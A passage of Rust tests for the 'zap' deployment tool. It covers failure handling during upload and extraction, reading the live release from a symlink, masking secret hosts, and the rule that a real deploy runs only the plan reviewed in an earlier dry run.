    let (outcomes, issued) = walk(
        MockConnection::new("host").with(upload_put(remote), failed("disk full")),
        dir.path().join("upload"),
    )
    .await;
    assert!(
        matches!(
            outcomes.as_slice(),
            [
                StepOutcome::Completed { .. },
                StepOutcome::Failed { step, error },
                StepOutcome::Skipped { .. },
            ] if step == "upload"
                && error.contains("disk full — the release archive is installed into \
                                      the app path (/srv/app), which must exist and be \
                                      writable by the connecting user; if `zap apply` \
                                      creates it, run that first")
        ),
        "{outcomes:?}"
    );
    assert_eq!(
        issued,
        [upload_put(remote)],
        "nothing was installed to remove"
    );

    let (outcomes, issued) = walk(
        MockConnection::new("host")
            .with(upload_put(remote), ok(""))
            .with("the script", failed("tar: short read")),
        dir.path().join("script"),
    )
    .await;
    assert!(
        matches!(
            outcomes.last(),
            Some(StepOutcome::Failed { step, error })
                if step == "extract_swap" && error.contains("short read")
        ),
        "{outcomes:?}"
    );
    assert_eq!(
        issued,
        [upload_put(remote), "the script".to_owned(), cleanup],
        "a script that may never have started leaves its archive to this"
    );

    // An upload with no archive made, and a script with none uploaded, fail as that.
    let mut steps = plan.steps.clone();
    steps.remove(0);
    let headless = DeployPlan {
        steps,
        ..plan.clone()
    };
    let scratch = dir.path().join("headless");
    std::fs::create_dir(&scratch).unwrap();
    let target = Connection::Mock(MockConnection::new("host"));
    let outcomes = execute_deploy_plan(
        &Connection::Local,
        &target,
        super::AppLive {
            app: "/root/app",
            previous: None,
        },
        &headless,
        ReleaseArchive::under(&scratch),
        &EventHandler::Null,
        &mut Vec::new(),
    )
    .await;
    assert!(
        matches!(
            outcomes.first(),
            Some(StepOutcome::Failed { error, .. })
                if error == "no release archive was created to upload"
        ),
        "{outcomes:?}"
    );
    let Connection::Mock(target) = target else {
        unreachable!()
    };
    assert_eq!(target.issued_commands(), Vec::<String>::new());
}

#[tokio::test]
async fn server_version_reads_current_symlink() {
    let mock = MockConnection::new("host").with(
        "if [ -L '/root/app/current' ]; then readlink -- '/root/app/current'; elif [ -e '/root/app/current' ]; then exit 4; else exit 3; fi",
        CommandOutput {
            success: true,
            code: 0,
            stdout: "/root/app/releases/def5678\n".to_owned(),
            stderr: String::new(),
        },
    );
    let version = server_version(&Connection::Mock(mock), "/root/app").await;
    assert_eq!(version.unwrap().as_deref(), Some("def5678"));
}

/// `current` names its release by its last segment with trailing slashes dropped, and
/// only by a release's name: a `.` segment, a path below a release, or no name at all
/// is a failed read, never a version — the prune and the rollback would key on it.
#[tokio::test]
async fn server_version_reads_only_a_release_name() {
    for (link, read) in [
        ("/root/app/releases/def5678/\n", Some("def5678")),
        ("releases/def5678//\n", Some("def5678")),
        ("/root/app/releases/def5678/.\n", None),
        ("/root/app/releases/def5678/sub\n", None),
        ("/\n", None),
        ("/root/app/releases/v1\n", None),
    ] {
        let mock = MockConnection::new("host").with(
            "if [ -L '/root/app/current' ]; then readlink -- '/root/app/current'; elif [ -e '/root/app/current' ]; then exit 4; else exit 3; fi",
            ok(link),
        );
        let version = server_version(&Connection::Mock(mock), "/root/app").await;
        if let Some(want) = read {
            assert_eq!(
                version.as_ref().map(Option::as_deref),
                Ok(Some(want)),
                "{link:?}"
            );
        } else {
            let error = version.unwrap_err();
            assert!(
                matches!(&error, super::LiveReadError::NoRelease(message) if message.contains("which is no release")),
                "{link:?}: {error:?}"
            );
        }
    }
}

#[tokio::test]
async fn server_version_is_none_when_not_deployed() {
    let mock = MockConnection::new("host").with(
        "if [ -L '/root/app/current' ]; then readlink -- '/root/app/current'; elif [ -e '/root/app/current' ]; then exit 4; else exit 3; fi",
        CommandOutput {
            success: false,
            code: 3,
            stdout: String::new(),
            stderr: String::new(),
        },
    );
    // The command ran and found nothing at `current` — a never-deployed host, not a
    // failure.
    let version = server_version(&Connection::Mock(mock), "/root/app").await;
    assert_eq!(version, Ok(None));
}

/// A read that *fails* is distinct from a host with no symlink. Folding the two
/// together would silently disarm the post-swap auto-rollback — `previous` is its only
/// target — and report "no previous release is known" about a host that has one.
#[tokio::test]
async fn server_version_distinguishes_a_failed_read_from_never_deployed() {
    // A `MockConnection` with no recording for the command errors, standing in for an
    // unreadable target (a dropped connection, a permissions problem).
    let mock = MockConnection::new("host");
    let result = server_version(&Connection::Mock(mock), "/root/app").await;
    assert!(
        result.is_err(),
        "an unreadable symlink must not masquerade as never-deployed: {result:?}"
    );
}

/// The read itself, run by a real shell: a link names its release, nothing there is
/// never deployed, and a directory at `current` is a failed read, not a fresh host.
#[tokio::test]
async fn server_version_tells_a_link_from_nothing_from_something_else() {
    let dir = tempfile::tempdir().unwrap();
    let app = dir.path().to_string_lossy().into_owned();
    let conn = Connection::Local;
    assert_eq!(server_version(&conn, &app).await, Ok(None));
    std::os::unix::fs::symlink(format!("{app}/releases/abc1234"), format!("{app}/current"))
        .unwrap();
    assert_eq!(
        server_version(&conn, &app).await,
        Ok(Some("abc1234".to_owned()))
    );
    std::fs::remove_file(format!("{app}/current")).unwrap();
    std::fs::create_dir(format!("{app}/current")).unwrap();
    let error = server_version(&conn, &app).await.unwrap_err();
    assert!(
        matches!(&error, super::LiveReadError::NotALink(message) if message.contains("is not a symlink")),
        "{error:?}"
    );
}

/// A deploy driven over two mocks: the operator box (git, identity, the tarball) and
/// the target (the live release, the drift preflight's read, the swap script).
struct Rig {
    home: tempfile::TempDir,
    config_path: std::path::PathBuf,
    config: zap_types::schema::ZapConfig,
    masker: crate::secret::SecretMasker,
    local: MockConnection,
    target: MockConnection,
}

const HOST: &str = "app.example.com";

/// A deploy to an unreachable target whose host and connecting user are secrets
/// fails with the connection error, and what it prints names each by its token —
/// the dry run's and the wetrun's alike (a wetrun of a plan on a masked host is
/// refused before it connects, with an error that names no value either).
#[tokio::test]
async fn a_connection_error_names_a_secret_host_and_user_by_token() {
    use crate::commands::refused_target::{self, RefusedTarget, assert_masked};

    let refused = RefusedTarget::new(&serde_json::json!([]));
    let local = Connection::Mock(
        MockConnection::new("local")
            .with(super::checkout::DIRTY_TREE_STATUS, ok(""))
            .with("git rev-parse --short=12 HEAD", ok("abc1234\n"))
            .with("whoami", ok("op\n"))
            .with("hostname", ok("box\n")),
    );
    let deploy = |options: DeployOptions| {
        let (refused, local) = (&refused, &local);
        async move {
            super::deploy_over(
                local,
                &refused.conn,
                &refused.config,
                refused.ctx(),
                &options,
                refused.home.path(),
            )
            .await
        }
    };
    assert_masked(
        "deploy",
        &deploy(DeployOptions::default()).await.unwrap_err(),
    );

    let wet = DeployOptions {
        wetrun: true,
        ..DeployOptions::default()
    };
    let error = deploy(wet).await.unwrap_err();
    assert!(
        matches!(error, crate::error::Error::WetrunRefused(_)),
        "{error:?}"
    );
    let rendered = error.render();
    for secret in [refused_target::HOST, refused_target::USER] {
        assert!(!rendered.contains(secret), "{rendered}");
    }
}

fn ok(stdout: &str) -> CommandOutput {
    CommandOutput {
        success: true,
        code: 0,
        stdout: stdout.to_owned(),
        stderr: String::new(),
    }
}

impl Rig {
    /// A clean checkout at `abc1234`, deploying to [`HOST`] serving `live`, whose one
    /// apply-managed resource (a directory) reads converged.
    fn new(live: &str) -> Self {
        Self::on(&Text::literal(HOST), live)
    }

    /// [`new`](Self::new) for a target declaring `host`.
    fn on(host: &Text, live: &str) -> Self {
        use zap_types::observe::{
            FileKind, Observation, PathFacet, PathObservation, Privilege, Query,
        };

        let home = tempfile::tempdir().unwrap();
        let config_path = home.path().join("zap.ts");
        let config = serde_json::from_value(serde_json::json!({
            "target": {"host": host, "user": "deploy"},
            "resources": [{"id": "data", "type": "directory", "path": "/srv/data"}],
            "deploy": {"build": "make", "artifacts": ["build/"], "path": "/srv/app"},
        }))
        .unwrap();
        let local = MockConnection::new("local")
            .with(super::checkout::DIRTY_TREE_STATUS, ok(""))
            .with("git rev-parse --short=12 HEAD", ok("abc1234\n"))
            .with("whoami", ok("op\n"))
            .with("hostname", ok("box\n"));
        let target = MockConnection::new(HOST)
            .with_user("deploy")
            .with(
                "if [ -L '/srv/app/current' ]; then readlink -- '/srv/app/current'; elif [ -e '/srv/app/current' ]; then exit 4; else exit 3; fi",
                ok(&format!("/srv/app/releases/{live}\n")),
            )
            .with("test -d '/srv/app/current'", ok(""))
            .with_observation(
                Query::Path {
                    path: "/srv/data".to_owned(),
                    facet: PathFacet::Kind,
                    privilege: Privilege::Login,
                },
                Observation::Path(PathObservation::Kind(FileKind::Directory)),
            );
        Self {
            home,
            config_path,
            config,
            masker: crate::secret::SecretRegistry::new().freeze().unwrap(),
            local,
            target,
        }
    }

    /// Replace the config's `deploy` block.
    fn with_deploy(mut self, deploy: serde_json::Value) -> Self {
        self.config.deploy = Some(serde_json::from_value(deploy).unwrap());
        self
    }

    /// Record the plan's own commands, so a wetrun of exactly that plan can run.
    fn recording(mut self, plan: &DeployPlan) -> Self {
        for step in &plan.steps {
            match &step.action {
                DeployAction::Build { command } | DeployAction::Tarball { command, .. } => {
                    self.local = self.local.with(command.clone(), ok(""));
                }
                DeployAction::ExtractSwap { script } => {
                    self.target = self
                        .target
                        .with(script.clone(), ok(&format!("{SWAPPED_LINE}\nDeployed\n")));
                }
                DeployAction::Upload { remote } => {
                    self.target = self.target.with(upload_put(remote), ok(""));
                }
                DeployAction::Restart { command } => {
                    self.target = self.target.with(command.clone(), ok(""));
                }
                // polled over HTTP, never through a connection
                DeployAction::Health { .. } | DeployAction::Readiness { .. } => {}
            }
        }
        self
    }

    async fn deploy(&self, options: &DeployOptions) -> crate::error::Result<DeployReport> {
        let ctx = crate::commands::PassContext {
            zap_home: Some(self.home.path()),
            config_path: &self.config_path,
            masker: &self.masker,
            bootstrap: false,
        };
        super::deploy_over(
            &Connection::Mock(self.local.clone()),
            &Connection::Mock(self.target.clone()),
            &self.config,
            ctx,
            options,
            &self.scratch(),
        )
        .await
    }

    /// Where a wetrun of this rig makes its private release directory: a directory
    /// of the rig's own, so a run leaves nothing anywhere else.
    fn scratch(&self) -> std::path::PathBuf {
        let scratch = self.home.path().join("scratch");
        std::fs::create_dir_all(&scratch).unwrap();
        scratch
    }

    /// The command of the last-run report on the target, if a pass recorded one.
    fn last_run(&self) -> Option<zap_types::last_run::RunCommand> {
        crate::last_run::read_last_run(self.home.path(), &self.config_path, HOST)
            .map(|run| run.command)
    }

    /// [`deploy`](Self::deploy) with no `~/.zap` root.
    async fn deploy_without_home(
        &self,
        options: &DeployOptions,
    ) -> crate::error::Result<DeployReport> {
        let ctx = crate::commands::PassContext {
            zap_home: None,
            config_path: &self.config_path,
            masker: &self.masker,
            bootstrap: false,
        };
        super::deploy_over(
            &Connection::Mock(self.local.clone()),
            &Connection::Mock(self.target.clone()),
            &self.config,
            ctx,
            options,
            &self.scratch(),
        )
        .await
    }

    /// The deploy preview recorded for [`HOST`], if there is one.
    fn preview(&self) -> Option<zap_types::deploy_preview::DeployPreview> {
        crate::deploy_preview::read_deploy_preview(self.home.path(), &self.config_path, HOST)
    }

    /// Where [`HOST`]'s deploy preview is filed.
    fn preview_path(&self) -> std::path::PathBuf {
        crate::home::deploy_preview_path_for(self.home.path(), &self.config_path, HOST)
    }

    /// Every file in the config's deploy-preview directory, for any host.
    fn previews_on_disk(&self) -> Vec<String> {
        let dir = crate::home::deploy_preview_dir_for(self.home.path(), &self.config_path);
        let Ok(entries) = std::fs::read_dir(dir) else {
            return Vec::new();
        };
        let mut names: Vec<String> = entries
            .map(|entry| entry.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        names.sort();
        names
    }

    /// The convergence plan as `zap plan` computes and records it on this home.
    async fn zap_plan(&self) -> String {
        let ctx = crate::commands::PassContext {
            zap_home: Some(self.home.path()),
            config_path: &self.config_path,
            masker: &self.masker,
            bootstrap: false,
        };
        crate::commands::detect_and_diff(
            &Connection::Mock(self.target.clone()),
            &self.config,
            ctx,
            &crate::commands::resolve_machine(&self.config, &self.masker, false).unwrap(),
            None,
            zap_types::last_run::RunCommand::Plan,
        )
        .await
        .unwrap()
        .plan_hash
        .hash()
        .unwrap()
        .to_owned()
    }

    /// Everything issued beyond the reads that build the plan.
    fn issued_past_the_plan(&self) -> Vec<String> {
        const PLAN_READS: [&str; 9] = [
            super::checkout::DIRTY_TREE_STATUS,
            super::checkout::DIRTY_TREE_DIFF,
            super::checkout::DIRTY_TREE_UNTRACKED,
            super::checkout::DIRTY_TREE_BLOBS,
            "git rev-parse --short=12 HEAD",
            "whoami",
            "hostname",
            "if [ -L '/srv/app/current' ]; then readlink -- '/srv/app/current'; elif [ -e '/srv/app/current' ]; then exit 4; else exit 3; fi",
            "test -d '/srv/app/current'",
        ];
        self.local
            .issued_commands()
            .into_iter()
            .chain(self.target.issued_commands())
            .filter(|command| !PLAN_READS.contains(&command.as_str()))
            .collect()
    }
}

/// The put a target is asked for when the release archive is uploaded to `remote`:
/// as the connecting user, at mode `600`.
fn upload_put(remote: &str) -> String {
    zap_types::deploy::upload_put_command(remote)
}

/// A wetrun with no `--expect-plan`: it binds to the recorded preview.
fn wetrun() -> DeployOptions {
    DeployOptions {
        wetrun: true,
        ..DeployOptions::default()
    }
}

fn wetrun_expecting(hash: &str) -> DeployOptions {
    DeployOptions {
        wetrun: true,
        expect_plan: Some(hash.to_owned()),
        ..DeployOptions::default()
    }
}

/// The hash a dry run prints binds the wetrun that follows it on the same checkout
/// and target: the wetrun computes the same plan, passes the preflight, and deploys.
#[tokio::test]
async fn a_wetrun_expecting_the_dry_runs_hash_deploys() {
    use zap_types::last_run::RunCommand;

    let dry = Rig::new("def5678")
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    assert_eq!(dry.outcome, DeployOutcome::DryRun);
    assert!(
        render_deploy(&dry).ends_with(&format!("plan_hash: {}\n", dry.plan_hash)),
        "{}",
        render_deploy(&dry)
    );

    let rig = Rig::new("def5678").recording(&dry.plan);
    let wet = rig.deploy(&wetrun_expecting(&dry.plan_hash)).await.unwrap();
    assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");
    assert_eq!(wet.plan_hash, dry.plan_hash);
    assert_eq!(wet.exit_code(), 0);
    assert_eq!(wet.step_outcomes.len(), dry.plan.steps.len());
    assert!(
        wet.step_outcomes
            .iter()
            .all(|outcome| matches!(outcome, StepOutcome::Completed { .. })),
        "{:?}",
        wet.step_outcomes
    );
    // The binding sits in front of the preflight, not in place of it.
    assert_eq!(rig.last_run(), Some(RunCommand::DeployPreflight));
}

/// A wetrun whose plan isn't the expected one refuses: exit 2, with the plan it
/// computed rendered under the refusal, and nothing beyond the reads that built that
/// plan — no drift preflight (no query, no last-run report) and no step. Neither
/// `--force` nor `--skip-preflight` reaches past it.
#[tokio::test]
async fn a_wetrun_expecting_another_plan_refuses_before_the_preflight_and_every_step() {
    let dry = Rig::new("def5678")
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    // The target moved to another release since the review, so the plan differs.
    for options in [
        wetrun_expecting(&dry.plan_hash),
        DeployOptions {
            force: true,
            skip_preflight: true,
            ..wetrun_expecting(&dry.plan_hash)
        },
    ] {
        let rig = Rig::new("0bee999");
        // Every step is runnable, so a step that didn't run was stopped, not failed.
        let moved = rig.deploy(&DeployOptions::default()).await.unwrap();
        let rig = rig.recording(&moved.plan);
        let report = rig.deploy(&options).await.unwrap();
        assert_ne!(report.plan_hash, dry.plan_hash);
        assert_eq!(report.outcome, refused(&dry.plan_hash), "{options:?}");
        assert_eq!(report.exit_code(), 2);
        assert!(report.wetrun);
        assert!(report.step_outcomes.is_empty());
        assert_eq!(rig.issued_past_the_plan(), Vec::<String>::new());
        assert!(rig.target.issued_queries().is_empty());
        assert_eq!(rig.last_run(), None);

        let rendered = render_deploy(&report);
        assert!(rendered.contains("(wetrun, refused)"), "{rendered}");
        assert!(
            rendered.contains("  - Create tarball (tarball)"),
            "{rendered}"
        );
        assert!(
            rendered.contains(&format!(
                "    --expect-plan {} does not match it.",
                dry.plan_hash
            )),
            "{rendered}"
        );
        assert!(
            rendered.ends_with(&format!(
                "re-run with --expect-plan {hash}, or without --expect-plan (it binds to \
                 this preview)\nplan_hash: {hash}\n",
                hash = report.plan_hash
            )),
            "{rendered}"
        );
    }
}

/// The everyday flow: a dry run records the plan it printed as the host's preview,
/// and the wetrun that follows binds to it with no flag and deploys. The deploy
/// spends the preview, and neither pass writes a last-run report of its own.
#[tokio::test]
async fn a_wetrun_after_a_dry_run_binds_to_its_preview_and_deploys() {
    use zap_types::deploy_preview::DeployPreviewPass;
    use zap_types::last_run::RunCommand;

    let rig = Rig::new("def5678");
    assert_eq!(rig.preview(), None);
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    assert_eq!(dry.outcome, DeployOutcome::DryRun);
    assert!(dry.warnings.is_empty(), "{:?}", dry.warnings);
    let preview = rig.preview().expect("the dry run records its preview");
    assert_eq!(preview.plan_hash, dry.plan_hash);
    assert_eq!(preview.pass, DeployPreviewPass::DryRun);
    assert_eq!(preview.host, HOST);
    assert_eq!(rig.previews_on_disk(), [format!("{HOST}.json")]);
    // The record holds the hash and nothing of the plan.
    let on_disk = std::fs::read_to_string(rig.preview_path()).unwrap();
    assert!(!on_disk.contains("/srv/app"), "{on_disk}");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        let mode = std::fs::metadata(rig.preview_path())
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o777, 0o600);
    }
    // A deploy dry run is no detection pass: it leaves no last-run report.
    assert_eq!(rig.last_run(), None);

    let rig = rig.recording(&dry.plan);
    let wet = rig.deploy(&wetrun()).await.unwrap();
    assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");
    assert_eq!(wet.plan_hash, dry.plan_hash);
    assert_eq!(wet.exit_code(), 0);
    assert!(rig.local.issued("make"));
    // The binding sits in front of the preflight, not in place of it.
    assert_eq!(rig.last_run(), Some(RunCommand::DeployPreflight));
    assert_eq!(rig.preview(), None, "the deploy spent its review");
    assert_eq!(rig.previews_on_disk(), Vec::<String>::new());
}

const GOLDEN_NO_PREVIEW_TAIL: &str = "  REFUSED — nothing ran: this plan is not the one that was reviewed.
    no deploy plan has been previewed for this host.
  review the plan above, then re-run `zap deploy --wetrun` with the same flags (it binds to this preview) or pass --expect-plan deadbeef
plan_hash: deadbeef
";
const GOLDEN_CHANGED_TAIL: &str = "  REFUSED — nothing ran: this plan is not the one that was reviewed.
    the last preview (zap deploy (dry run) at 2026-09-28T12:00:00Z) planned 0123abcd; the config, `zap.lock`, the checkout, the flags, the target, or the environment its host, user, or health domain resolve from changed since.
  review the plan above, then re-run `zap deploy --wetrun` with the same flags (it binds to this preview) or pass --expect-plan deadbeef
plan_hash: deadbeef
";

/// The two refusals that read the recorded preview, word for word under the plan —
/// and the time and hash read back from disk are escaped like any other text.
#[test]
fn a_refusal_for_want_of_a_preview_says_why_and_how_to_bind() {
    use zap_types::deploy_preview::DeployPreviewPass;

    let changed = |reviewed: &str, ran_at: &str, command| {
        DeployOutcome::Refused(PlanUnreviewed::Changed {
            reviewed: reviewed.to_owned(),
            command,
            ran_at: ran_at.to_owned(),
        })
    };
    let none = render_deploy(&report(
        DeployOutcome::Refused(PlanUnreviewed::NoPreview { prior: None }),
        vec![],
    ));
    assert!(none.ends_with(GOLDEN_NO_PREVIEW_TAIL), "{none}");
    assert!(none.starts_with("deploy — target host.example (wetrun, refused)\n"));
    assert!(none.contains("  - Create tarball (tarball)"), "{none}");

    let moved = render_deploy(&report(
        changed(
            "0123abcd",
            "2026-09-28T12:00:00Z",
            DeployPreviewPass::DryRun,
        ),
        vec![],
    ));
    assert!(moved.ends_with(GOLDEN_CHANGED_TAIL), "{moved}");

    let hostile = render_deploy(&report(
        changed(
            "abc\nplan_hash: 0000",
            "now\u{1b}[2K",
            DeployPreviewPass::RefusedWetrun,
        ),
        vec![],
    ));
    assert!(
        hostile.contains(
            "    the last preview (zap deploy --wetrun, refused (its plan was not the \
             reviewed one) at now<U+001B>[2K) planned abc<U+000A>plan_hash: 0000; the config"
        ),
        "{hostile}"
    );
    assert_eq!(
        hostile
            .lines()
            .filter(|line| line.starts_with("plan_hash:"))
            .count(),
        1
    );
}

/// A wetrun fired with nothing previewed refuses — exit 2, the plan rendered, no
/// preflight and no step — and that render is the preview: the same wetrun again
/// binds to it and deploys.
#[tokio::test]
async fn a_cold_wetrun_refuses_records_its_plan_and_the_next_deploys() {
    use zap_types::deploy_preview::DeployPreviewPass;

    let rig = Rig::new("def5678");
    let plan = rig.deploy_without_home(&DeployOptions::default()).await;
    let rig = rig.recording(&plan.unwrap().plan);
    assert_eq!(rig.preview(), None);

    let cold = rig.deploy(&wetrun()).await.unwrap();
    assert_eq!(
        cold.outcome,
        DeployOutcome::Refused(PlanUnreviewed::NoPreview { prior: None })
    );
    assert_eq!(cold.exit_code(), 2);
    assert!(cold.wetrun && !cold.streamed());
    assert!(cold.step_outcomes.is_empty());
    assert_eq!(rig.issued_past_the_plan(), Vec::<String>::new());
    assert!(rig.target.issued_queries().is_empty());
    assert_eq!(rig.last_run(), None);
    let rendered = render_deploy(&cold);
    assert!(rendered.contains("(wetrun, refused)"), "{rendered}");
    assert!(
        rendered.ends_with(&GOLDEN_NO_PREVIEW_TAIL.replace("deadbeef", &cold.plan_hash)),
        "{rendered}"
    );
    let preview = rig.preview().expect("the refusal records what it rendered");
    assert_eq!(preview.plan_hash, cold.plan_hash);
    assert_eq!(preview.pass, DeployPreviewPass::RefusedWetrun);

    let wet = rig.deploy(&wetrun()).await.unwrap();
    assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");
    assert_eq!(wet.plan_hash, cold.plan_hash);
}

/// The preview binds one plan. A config, a tree, or a flag that changed after it
/// makes another plan, and the wetrun refuses naming the preview it found — and
/// becomes the preview of the plan it rendered.
#[tokio::test]
async fn a_change_after_the_preview_refuses_the_wetrun() {
    use zap_types::deploy_preview::DeployPreviewPass;

    type Change = (&'static str, fn(&mut Rig), DeployOptions);
    let changes: [Change; 3] = [
        (
            "the config",
            |rig| {
                rig.config.deploy = Some(
                    serde_json::from_value(serde_json::json!({
                        "build": "make all", "artifacts": ["build/"], "path": "/srv/app",
                    }))
                    .unwrap(),
                );
            },
            wetrun(),
        ),
        (
            "the tree",
            |rig| {
                rig.local = rig
                    .local
                    .clone()
                    .with(super::checkout::DIRTY_TREE_STATUS, ok(" M src/app.ts\n"))
                    .with(super::checkout::DIRTY_TREE_DIFF, ok("+change\n"))
                    .with(super::checkout::DIRTY_TREE_UNTRACKED, ok(""));
            },
            DeployOptions {
                force: true,
                ..wetrun()
            },
        ),
        (
            "a flag",
            |_| {},
            DeployOptions {
                skip_build: true,
                ..wetrun()
            },
        ),
    ];
    for (what, change, options) in changes {
        let mut rig = Rig::new("def5678");
        let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
        let reviewed = rig.preview().unwrap();
        change(&mut rig);
        let moved = rig
            .deploy_without_home(&DeployOptions {
                wetrun: false,
                ..options.clone()
            })
            .await
            .unwrap();
        let rig = rig.recording(&moved.plan);

        let report = rig.deploy(&options).await.unwrap();
        assert_ne!(report.plan_hash, dry.plan_hash, "{what}");
        assert_eq!(
            report.outcome,
            DeployOutcome::Refused(PlanUnreviewed::Changed {
                reviewed: dry.plan_hash.clone(),
                command: DeployPreviewPass::DryRun,
                ran_at: reviewed.ran_at.clone(),
            }),
            "{what}"
        );
        assert_eq!(report.exit_code(), 2);
        assert_eq!(rig.issued_past_the_plan(), Vec::<String>::new(), "{what}");
        assert!(rig.target.issued_queries().is_empty(), "{what}");
        // The refusal block, then the foot (a dirty tree's warning sits between).
        let rendered = render_deploy(&report);
        let tail = GOLDEN_CHANGED_TAIL
            .replace("0123abcd", &dry.plan_hash)
            .replace("2026-09-28T12:00:00Z", &reviewed.ran_at)
            .replace("deadbeef", &report.plan_hash);
        let (block, foot) = tail.split_at(tail.find("plan_hash: ").unwrap());
        assert!(rendered.contains(block), "{what}: {rendered}");
        assert!(rendered.ends_with(foot), "{what}: {rendered}");
        // The refusal rendered the moved plan, so that is the preview now.
        let preview = rig.preview().unwrap();
        assert_eq!(preview.plan_hash, report.plan_hash, "{what}");
        assert_eq!(preview.pass, DeployPreviewPass::RefusedWetrun, "{what}");
    }
}

/// `--expect-plan` binds alone. The recorded preview neither rescues a hash that
/// isn't the plan's nor refuses one that is: a wetrun expecting the right hash
/// deploys over a preview of another plan, and one expecting a wrong hash refuses
/// over a preview of this very plan.
#[tokio::test]
async fn expect_plan_binds_alone_whatever_is_recorded() {
    let skip = DeployOptions {
        skip_build: true,
        ..DeployOptions::default()
    };
    let rig = Rig::new("def5678");
    let skipped = rig.deploy_without_home(&skip).await.unwrap();
    // The recorded preview is the with-build plan's.
    let built = rig.deploy(&DeployOptions::default()).await.unwrap();
    assert_ne!(built.plan_hash, skipped.plan_hash);
    let rig = rig.recording(&built.plan);

    let wrong = rig.deploy(&wetrun_expecting("not-the-plan")).await.unwrap();
    assert_eq!(wrong.plan_hash, built.plan_hash);
    assert_eq!(wrong.outcome, refused("not-the-plan"));
    assert_eq!(rig.issued_past_the_plan(), Vec::<String>::new());

    // Back to a preview of the with-build plan; the skipping wetrun names its own.
    rig.deploy(&DeployOptions::default()).await.unwrap();
    assert_eq!(rig.preview().unwrap().plan_hash, built.plan_hash);
    let right = rig
        .deploy(&DeployOptions {
            skip_build: true,
            ..wetrun_expecting(&skipped.plan_hash)
        })
        .await
        .unwrap();
    assert_eq!(right.outcome, DeployOutcome::Deployed, "{right:?}");
    assert!(!rig.local.issued("make"));
    // An executed deploy spends whatever preview is recorded, bound to it or not.
    assert_eq!(rig.preview(), None);
}

/// The deploy preview and the convergence preview are two records. A `zap plan`
/// between a deploy dry run and its wetrun leaves the deploy bound, and a deploy dry
/// run between `zap plan` and `zap apply --wetrun` leaves the last-run report — what
/// `apply`'s gate reads — the plan's.
#[tokio::test]
async fn the_deploy_preview_and_the_convergence_preview_do_not_replace_each_other() {
    use zap_types::last_run::{RunCommand, review_plan};

    let rig = Rig::new("def5678");
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    let recorded = rig.preview().unwrap();
    let plan_hash = rig.zap_plan().await;
    assert_eq!(rig.last_run(), Some(RunCommand::Plan));
    assert_eq!(rig.preview(), Some(recorded), "`zap plan` left it alone");
    let rig = rig.recording(&dry.plan);
    let wet = rig.deploy(&wetrun()).await.unwrap();
    assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");

    // The other way round, through the rule and the record `apply`'s gate uses.
    let rig = Rig::new("def5678");
    let plan_hash_again = rig.zap_plan().await;
    assert_eq!(plan_hash_again, plan_hash);
    let before = std::fs::read(crate::home::last_run_path_for(
        rig.home.path(),
        &rig.config_path,
        HOST,
    ))
    .unwrap();
    rig.deploy(&DeployOptions::default()).await.unwrap();
    // And a refused deploy wetrun, which records a preview too.
    let refused = rig.deploy(&wetrun_expecting("not-the-plan")).await.unwrap();
    assert!(matches!(refused.outcome, DeployOutcome::Refused(_)));
    let after = std::fs::read(crate::home::last_run_path_for(
        rig.home.path(),
        &rig.config_path,
        HOST,
    ))
    .unwrap();
    assert_eq!(
        before, after,
        "the last-run report is byte for byte the plan's"
    );
    let prior = crate::last_run::read_last_run(rig.home.path(), &rig.config_path, HOST);
    assert_eq!(
        prior.as_ref().map(|run| run.command),
        Some(RunCommand::Plan)
    );
    assert_eq!(review_plan(&plan_hash, None, prior.as_ref()), Ok(()));
}

/// A run that prints no `plan_hash` records no preview: an already-deployed target,
/// dry or wet, shows no plan — and the wetrun short-circuits ahead of the gate, so
/// it isn't a refusal either.
#[tokio::test]
async fn an_already_deployed_target_records_no_preview() {
    let rig = Rig::new("abc1234");
    for options in [DeployOptions::default(), wetrun()] {
        let report = rig.deploy(&options).await.unwrap();
        assert_eq!(
            report.outcome,
            DeployOutcome::AlreadyDeployed,
            "{options:?}"
        );
        assert_eq!(report.exit_code(), 0);
        assert!(!render_deploy(&report).contains("plan_hash"));
        assert_eq!(rig.previews_on_disk(), Vec::<String>::new(), "{options:?}");
    }
}

/// A wetrun that passes the gate and bails at the drift preflight printed no hash,
/// so it records nothing — and it ran nothing, so the preview it bound to stands:
/// once the target reads clean the same reviewed plan deploys.
#[tokio::test]
async fn a_preflight_bail_records_nothing_and_leaves_the_preview() {
    use zap_types::observe::{Observation, PathFacet, PathObservation, Privilege, Query};

    let data = || Query::Path {
        path: "/srv/data".to_owned(),
        facet: PathFacet::Kind,
        privilege: Privilege::Login,
    };
    let unread = || {
        MockConnection::new(HOST).with_user("deploy").with(
            "if [ -L '/srv/app/current' ]; then readlink -- '/srv/app/current'; elif [ -e '/srv/app/current' ]; then exit 4; else exit 3; fi",
            ok("/srv/app/releases/def5678\n"),
        )
    };
    for (target, bail) in [
        (unread(), DeployOutcome::PreflightUndetermined),
        (
            unread().with_observation(data(), Observation::Path(PathObservation::Failed)),
            DeployOutcome::PreflightDrift,
        ),
    ] {
        // Bound by `--expect-plan` with nothing recorded: still nothing recorded.
        let mut rig = Rig::new("def5678");
        let clean = rig.target.clone();
        rig.target = target;
        let plan = rig.deploy_without_home(&DeployOptions::default()).await;
        let plan = plan.unwrap();
        let report = rig
            .deploy(&wetrun_expecting(&plan.plan_hash))
            .await
            .unwrap();
        assert_eq!(report.outcome, bail);
        assert_eq!(report.exit_code(), 2);
        assert_eq!(rig.previews_on_disk(), Vec::<String>::new(), "{bail:?}");

        // Bound by a preview: the bail leaves it exactly as the dry run wrote it.
        rig.deploy(&DeployOptions::default()).await.unwrap();
        let before = std::fs::read(rig.preview_path()).unwrap();
        let report = rig.deploy(&wetrun()).await.unwrap();
        assert_eq!(report.outcome, bail);
        let rendered = render_deploy(&report);
        assert!(!rendered.contains("plan_hash"));
        // The drift bail names the flow that works; neither bail offers a flag that
        // would make another plan.
        assert_eq!(
